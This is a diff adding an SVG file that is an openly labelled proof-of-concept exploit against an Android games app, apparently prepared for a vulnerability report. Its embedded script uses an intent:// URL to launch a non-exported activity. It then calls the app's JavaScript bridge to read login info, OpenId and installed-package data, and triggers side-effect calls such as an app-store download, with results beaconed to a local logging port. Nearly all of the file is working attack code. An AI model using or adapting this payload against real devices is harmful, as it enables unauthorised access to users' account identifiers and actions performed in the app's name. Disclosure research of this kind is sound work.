@@ -1,0 +1,107 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 660 1200">
+  <rect width="100%" height="100%" fill="#ffffff"/>
+  <g font-family="monospace" font-size="14" fill="#000000">
+    <text x="8" y="22">POC (button-driven) — tap the button to advance</text>
+    <text x="8" y="42">(served from whitelisted host cdn.jsdelivr.net)</text>
+    <text id="l1"  x="8" y="70"/>
+    <text id="l2"  x="8" y="90"/>
+    <text id="l3"  x="8" y="110"/>
+    <text id="l4"  x="8" y="130"/>
+    <text id="l5"  x="8" y="150"/>
+    <text id="l6"  x="8" y="170"/>
+    <text id="l7"  x="8" y="190"/>
+    <text id="l8"  x="8" y="210"/>
+    <text id="l9"  x="8" y="230"/>
+    <text id="l10" x="8" y="250"/>
+    <text id="l11" x="8" y="270"/>
+    <text id="l12" x="8" y="290"/>
+    <text id="l13" x="8" y="310"/>
+    <text id="l14" x="8" y="330"/>
+  </g>
+
+  <!-- 第 1 跳：手动触发二跳（原为 900ms 自动执行） -->
+  <g id="btn1" display="none" style="cursor:pointer">
+    <rect x="16" y="380" width="628" height="100" rx="12" fill="#1a73e8"/>
+    <text x="330" y="424" text-anchor="middle" font-family="sans-serif" font-size="26" fill="#ffffff">▶ 二跳：拉起非导出容器</text>
+    <text x="330" y="458" text-anchor="middle" font-family="sans-serif" font-size="18" fill="#dbe8ff">GameOnlyPlayActivity (exported=false)</text>
+  </g>
+
+  <!-- 第 2 跳：手动触发有副作用的动作（原为自动调用，会拉起应用商店） -->
+  <g id="btn2" display="none" style="cursor:pointer">
+    <rect x="16" y="380" width="628" height="64" rx="10" fill="#1a73e8"/>
+    <text x="330" y="420" text-anchor="middle" font-family="sans-serif" font-size="22" fill="#ffffff">▶ showToast</text>
+  </g>
+  <g id="btn3" display="none" style="cursor:pointer">
+    <rect x="16" y="466" width="628" height="92" rx="10" fill="#c5221f"/>
+    <text x="330" y="506" text-anchor="middle" font-family="sans-serif" font-size="21" fill="#ffffff">▶ downloadOrUpdate</text>
+    <text x="330" y="534" text-anchor="middle" font-family="sans-serif" font-size="15" fill="#ffd9d7">（会以 App 身份拉起应用商店安装页）</text>
+  </g>
+
+  <script type="text/javascript"><![CDATA[
+  /* 自推进链路的“手动版”：页面加载后只做只读取值并渲染，
+     两处会导航/产生副作用的动作改为屏幕上的按钮，点一下才执行 —— 便于逐屏截全图。
+       hop1: HybridWebViewActivity（exported=false，外部 deeplink 驱动）
+       hop2: GameOnlyPlayActivity（exported=false，页面内 intent:// 驱动，注册 GamesJS） */
+  var stage = (location.search.indexOf('stage=2') >= 0) ? 2 : 1;
+  var lines = [], MAX = 14;
+  function el(i){ return document.getElementById('l' + (i + 1)); }
+  function paint(){ for (var i = 0; i < MAX; i++){ var e = el(i); if (e) e.textContent = lines[i] || ''; } }
+  function put(s){ if (lines.length < MAX) { lines.push(s); } else { lines.shift(); lines.push(s); } paint(); }
+  function beacon(k, v){
+    try { new Image().src = 'http://127.0.0.1:8899/beacon?k=' + encodeURIComponent('btn.' + k)
+      + '&v=' + encodeURIComponent(String(v).slice(0, 500)) + '&r=' + Math.random(); } catch(e){}
+  }
+  function log(k, v){ put(k + ' = ' + String(v).slice(0, 90)); beacon(k, v); }
+  function promptCall(method, args){
+    try { return String(prompt(JSON.stringify({method: method, args: args || {}}))); } catch(e){ return 'ERR:' + e; }
+  }
+  function jsapi(method, params){
+    try { if (!window.appJsBridge) return 'NO_appJsBridge';
+      var r = (params === undefined) ? window.appJsBridge.callApi(method) : window.appJsBridge.callApi(method, params);
+      return (r === undefined) ? '<void>' : String(r);
+    } catch(e){ return 'ERR:' + e; }
+  }
+  function show(id){ var e = document.getElementById(id); if (e) e.setAttribute('display', 'inline'); }
+  function on(id, fn){ var e = document.getElementById(id); if (e) e.addEventListener('click', fn); }
+
+  log('href', location.href);
+  log('stage', stage);
+
+  if (stage === 1) {
+    /* ---- hop1：只读取值 + 显示按钮（不自动二跳） ---- */
+    log('appJsBridge', typeof window.appJsBridge);
+    log('prompt.getEnv.isLogin', promptCall('getEnv', {key: 'isLogin'}));
+    log('prompt.getEnv.network', promptCall('getEnv', {key: 'network'}));
+    log('prompt.getEnv.apkversion', promptCall('getEnv', {key: 'apkversion'}));
+    log('ready', 'tap the blue button to advance');
+    show('btn1');
+    on('btn1', function(){
+      var self = location.href.split('#')[0].split('?')[0];
+      var it = 'intent://launch#Intent;component=com.heytap.games.forum/'
+        + 'com.games.gameslobby.tangram.activity.GameOnlyPlayActivity;'
+        + 'S.url=' + self + '?stage=2;S.appid=1000001;end';
+      log('firing intent ->', 'GameOnlyPlayActivity (exported=false)');
+      try { location.href = it; } catch(e){ log('intent_ERR', e); }
+    });
+  } else {
+    /* ---- hop2：只读全表（不自动调用有副作用的动作） ---- */
+    log('appJsBridge', typeof window.appJsBridge);
+    log('getBrand', jsapi('getBrand'));
+    log('isLogin', jsapi('isLogin'));
+    log('getLoginInfo', jsapi('getLoginInfo'));
+    log('getOpenId', jsapi('getOpenId'));
+    log('getHost', jsapi('getHost'));
+    log('getNetworkType', jsapi('getNetworkType'));
+    log('isInstalled(settings)', jsapi('isInstalled', {packageName: 'com.android.settings'}));
+    log('checkNeedDownload', jsapi('checkIfNeedDownloadOrUpdate', {pkg: 'com.android.settings', version: 1}));
+    log('ready', 'read-only done; tap a button for side-effect calls');
+    show('btn2'); show('btn3');
+    on('btn2', function(){
+      log('showToast', jsapi('showToast', {text: 'POC: attacker page called GamesJS', duration: 1}));
+    });
+    on('btn3', function(){
+      log('downloadOrUpdate', jsapi('downloadOrUpdate', {pkg: 'com.poc.nonexistent.app'}));
+    });
+  }
+  ]]></script>
+</svg>
